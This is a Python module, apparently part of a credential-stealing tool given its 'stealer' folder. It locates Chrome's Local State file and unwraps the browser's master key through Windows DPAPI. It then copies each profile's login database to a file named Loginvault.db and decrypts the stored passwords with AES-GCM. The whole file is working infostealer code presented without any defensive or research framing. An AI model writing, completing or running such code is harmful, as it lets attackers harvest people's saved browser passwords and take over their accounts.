import logging
import os
import json
import base64
import re
import sqlite3
import shutil

import win32crypt
from Cryptodome.Cipher import AES

from func import *

CHROME_PATH_LOCAL_STATE = os.path.normpath(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State")
CHROME_PATH = os.path.normpath(rf"{os.environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data")

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] # Remove suffix DPAPI
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        logging.error("Chrome secret key not found")
        logging.error(e)
        return None

def get_data_folders():
    return [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, f"{MODULES_DIR}\\stealer\\Loginvault.db") 
        return sqlite3.connect(f"{MODULES_DIR}\\stealer\\Loginvault.db")
    except Exception as e:
        logging.error("Chrome database cannot be found")
        logging.error(e)
        return None

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode() 
        return decrypted_pass
    except Exception as e:
        logging.error("Error during password decrypt")
        logging.error(e)
        return None